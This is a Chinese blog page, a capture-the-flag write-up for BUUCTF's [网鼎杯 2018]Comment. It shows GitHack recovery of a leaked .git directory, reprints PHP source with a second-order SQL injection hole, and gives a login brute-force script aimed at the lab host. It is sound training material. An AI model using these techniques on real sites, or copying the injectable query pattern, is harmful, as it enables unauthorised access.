@@ -1,0 +1,886 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="South">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[网鼎杯 2018]Comment参考:[网鼎杯 2018]Comment_[网鼎杯 2018]comment-git泄露部分-CSDN博客 [BUUCTF题解][网鼎杯 2018]Comment - Article_kelp - 博客园 (cnblogs.com) 场景: 发一个贴:  跳转到了login.php页面，需要我们先登录，但是我们并不知道账户信息 使用dirsearch查找后台文件:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF_[网鼎杯 2018]Comment">
+<meta property="og:url" content="http://example.com/2024/02/18/2024-02-18-[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment/index.html">
+<meta property="og:site_name" content="South">
+<meta property="og:description" content="[网鼎杯 2018]Comment参考:[网鼎杯 2018]Comment_[网鼎杯 2018]comment-git泄露部分-CSDN博客 [BUUCTF题解][网鼎杯 2018]Comment - Article_kelp - 博客园 (cnblogs.com) 场景: 发一个贴:  跳转到了login.php页面，需要我们先登录，但是我们并不知道账户信息 使用dirsearch查找后台文件:">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206185914016.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206190135200.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206190153951.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206201103518.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206215053245.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206211820455.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206215203379.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206215452510.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206221723755.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206221658271.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240206221854959.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208150050832.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208163528399.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208163455987.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208163808384.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208164903572.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208164920824.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208164947387.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208195316538.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208204121356.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208204155277.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208204226712.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208204404395.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208204413754.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208211027230.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208211058023.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208212651712.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208212737550.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208220114550.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208223425313.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208224046928.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208224711172.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208224815804.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208225236611.png">
+<meta property="og:image" content="http://example.com/images/2024-2-18/image-20240208225359567.png">
+<meta property="article:published_time" content="2024-02-18T15:37:26.442Z">
+<meta property="article:modified_time" content="2024-02-18T16:07:15.186Z">
+<meta property="article:author" content="South">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/2024-2-18/image-20240206185914016.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>BUUCTF_[网鼎杯 2018]Comment - South</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"ThR4XZRMA2SwXDt3MeF5vjCN-gzGzoHsz","app_key":"PmUqfFPhyiQDRYmHOO0IXjTV","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>South</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="BUUCTF_[网鼎杯 2018]Comment"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-18 23:37" pubdate>
+          2024年2月18日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          25k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          206 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">BUUCTF_[网鼎杯 2018]Comment</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/SopRomeo/article/details/105874485">网鼎杯 2018]Comment_[网鼎杯 2018]comment-git泄露部分-CSDN博客</a></p>
+<p>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Article-kelp/p/16077919.html">BUUCTF题解][网鼎杯 2018]Comment - Article_kelp - 博客园 (cnblogs.com)</a></p>
+<h2 id="场景"><a href="#场景" class="headerlink" title="场景:"></a>场景:</h2><p><img src="/images/2024-2-18/image-20240206185914016.png" srcset="/img/loading.gif" lazyload alt="image-20240206185914016"></p>
+<h2 id="发一个贴"><a href="#发一个贴" class="headerlink" title="发一个贴:"></a>发一个贴:</h2><p><img src="/images/2024-2-18/image-20240206190135200.png" srcset="/img/loading.gif" lazyload alt="image-20240206190135200"></p>
+<p><img src="/images/2024-2-18/image-20240206190153951.png" srcset="/img/loading.gif" lazyload alt="image-20240206190153951"></p>
+<p>跳转到了login.php页面，需要我们先登录，但是我们并不知道账户信息</p>
+<h2 id="使用dirsearch查找后台文件"><a href="#使用dirsearch查找后台文件" class="headerlink" title="使用dirsearch查找后台文件:"></a>使用dirsearch查找后台文件:</h2><p><img src="/images/2024-2-18/image-20240206201103518.png" srcset="/img/loading.gif" lazyload alt="image-20240206201103518"></p>
+<p>发现大量的.git文件，猜测网页存在.git文件泄露</p>
+<h2 id="使用githack获取泄露文件"><a href="#使用githack获取泄露文件" class="headerlink" title="使用githack获取泄露文件:"></a>使用githack获取泄露文件:</h2><p>kali:</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">python2 GitHack.py -u http://91de20fb-1487-499f-9de7-6d8134c660b8.node5.buuoj.cn:81/.git<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240206215053245.png" srcset="/img/loading.gif" lazyload alt="image-20240206215053245"></p>
+<h2 id="代码审计分析"><a href="#代码审计分析" class="headerlink" title="代码审计分析:"></a>代码审计分析:</h2><h3 id="write-do-php"><a href="#write-do-php" class="headerlink" title="write_do.php:"></a>write_do.php:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-comment">// 启动会话，用户保存页面之间的交互信息</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-comment">// 先判断用户是否已经登录</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-comment">// 判断参数do是否为空</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="BP抓取发帖的数据包"><a href="#BP抓取发帖的数据包" class="headerlink" title="BP抓取发帖的数据包:"></a>BP抓取发帖的数据包:</h3><p><img src="/images/2024-2-18/image-20240206211820455.png" srcset="/img/loading.gif" lazyload alt="image-20240206211820455"></p>
+<p><strong>根据我们对web前端的了解，我们要发帖的时候,是启动了write的选项，同时获取了我们的title&amp;category&amp;content三个参数的值，一般来说肯定会有对输入参数的操作，比如写入数据之类的，但是在write_do.php代码中却是空白的内容，这极有可能是.git泄露的文件发生了损坏，我们需要进行修复</strong></p>
+<h3 id="修复-git泄露文件write-do-php："><a href="#修复-git泄露文件write-do-php：" class="headerlink" title="修复.git泄露文件write_do.php："></a>修复.git泄露文件write_do.php：</h3><h4 id="切换到-git泄露文件的保存文件夹目录下"><a href="#切换到-git泄露文件的保存文件夹目录下" class="headerlink" title="切换到.git泄露文件的保存文件夹目录下:"></a>切换到.git泄露文件的保存文件夹目录下:</h4><p><img src="/images/2024-2-18/image-20240206215203379.png" srcset="/img/loading.gif" lazyload alt="image-20240206215203379"></p>
+<h4 id="在该文件下运行一下命令："><a href="#在该文件下运行一下命令：" class="headerlink" title="在该文件下运行一下命令："></a>在该文件下运行一下命令：</h4><p><strong>该命令用于查看：</strong></p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">git log --all<br>或<br>git log --reflog<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240206215452510.png" srcset="/img/loading.gif" lazyload alt="image-20240206215452510"></p>
+<p>root用户最后提交的文件信息中有write_do.php，可能对该文件有更加完整的修改，我们可以恢复一下最后的文件</p>
+<h4 id="使用以下命令恢复最后提交的文件"><a href="#使用以下命令恢复最后提交的文件" class="headerlink" title="使用以下命令恢复最后提交的文件:"></a>使用以下命令恢复最后提交的文件:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">git reset --hard  e5b2a2443c2b6d395d06960123142bc91123148c<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240206221723755.png" srcset="/img/loading.gif" lazyload alt="image-20240206221723755"></p>
+<h4 id="再次查看当前文件夹下的write-do-php："><a href="#再次查看当前文件夹下的write-do-php：" class="headerlink" title="再次查看当前文件夹下的write_do.php："></a>再次查看当前文件夹下的write_do.php：</h4><p><img src="/images/2024-2-18/image-20240206221658271.png" srcset="/img/loading.gif" lazyload alt="image-20240206221658271"></p>
+<p><img src="/images/2024-2-18/image-20240206221854959.png" srcset="/img/loading.gif" lazyload alt="image-20240206221854959"></p>
+<p>文件内容被修复了！！！</p>
+<h4 id="完整的write-do-php："><a href="#完整的write-do-php：" class="headerlink" title="完整的write_do.php："></a>完整的write_do.php：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>    <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+<h2 id="登录系统"><a href="#登录系统" class="headerlink" title="登录系统:"></a>登录系统:</h2><p><img src="/images/2024-2-18/image-20240208150050832.png" srcset="/img/loading.gif" lazyload alt="image-20240208150050832"></p>
+<p>由于我们在对数据库的操作之前必须要先登录系统，所以我们要先尝试登录它，根据登录页面，我们发现用户名框显示zhangwei,密码框显示zhangwei***，一开始我以为是账户的输入格式，但是看了大佬的wp知道这是作者给的提示，账户名是zhangwei,密码是zhangwei***,***是被保密的内容，可能为三个数字，或者三个字母等情况，所以需要我们去爆破</p>
+<h3 id="猜测-是数字："><a href="#猜测-是数字：" class="headerlink" title="猜测***是数字："></a>猜测***是数字：</h3><h4 id="密码爆破脚本"><a href="#密码爆破脚本" class="headerlink" title="密码爆破脚本:"></a>密码爆破脚本:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> res<br><span class="hljs-keyword">import</span> time<br>url=<span class="hljs-string">&quot;http://4d72a730-6e40-40d9-871b-ebf645b86e7c.node5.buuoj.cn:81/login.php&quot;</span><br><span class="hljs-comment"># 将数字的长度补成长度为3的字符串</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">num</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&#x27;0&#x27;</span>*(<span class="hljs-number">3</span>-<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>(num))))+<span class="hljs-built_in">str</span>(num)<br><br><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">333</span>,<span class="hljs-number">1000</span>):<br>    passwd = change(num)<br>    data = &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;zhangwei&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;zhangwei&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd)<br>    &#125;<br>    resp = res.post(url=url, data=data)<br>    <span class="hljs-comment"># 用响应数据包的长度来判断正确密码</span><br>    <span class="hljs-comment"># 设置登录失败的长度，可以先注释该代码查看失败的数据包长度，再启用</span><br>    fail_len = <span class="hljs-number">1722</span><br>    <span class="hljs-built_in">print</span>(passwd + <span class="hljs-string">&#x27;=&gt;&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(resp.text)))<br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(resp.text)!=fail_len):<br>        <span class="hljs-keyword">break</span><br>    <br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240208163528399.png" srcset="/img/loading.gif" lazyload alt="image-20240208163528399"></p>
+<p>最终得到666所反应得数据包长度不同，那么它就是***</p>
+<p><img src="/images/2024-2-18/image-20240208163455987.png" srcset="/img/loading.gif" lazyload alt="image-20240208163455987"></p>
+<p>成功登录！！！</p>
+<h2 id="随便发一个贴："><a href="#随便发一个贴：" class="headerlink" title="随便发一个贴："></a>随便发一个贴：</h2><p><img src="/images/2024-2-18/image-20240208163808384.png" srcset="/img/loading.gif" lazyload alt="image-20240208163808384"></p>
+<h3 id="点击详情查看一下："><a href="#点击详情查看一下：" class="headerlink" title="点击详情查看一下："></a>点击详情查看一下：</h3><p><img src="/images/2024-2-18/image-20240208164903572.png" srcset="/img/loading.gif" lazyload alt="image-20240208164903572"></p>
+<h3 id="提交一下我们得留言"><a href="#提交一下我们得留言" class="headerlink" title="提交一下我们得留言:"></a>提交一下我们得留言:</h3><p><img src="/images/2024-2-18/image-20240208164920824.png" srcset="/img/loading.gif" lazyload alt="image-20240208164920824"></p>
+<p><img src="/images/2024-2-18/image-20240208164947387.png" srcset="/img/loading.gif" lazyload alt="image-20240208164947387"></p>
+<p>发现我们的留言被显示出来了。</p>
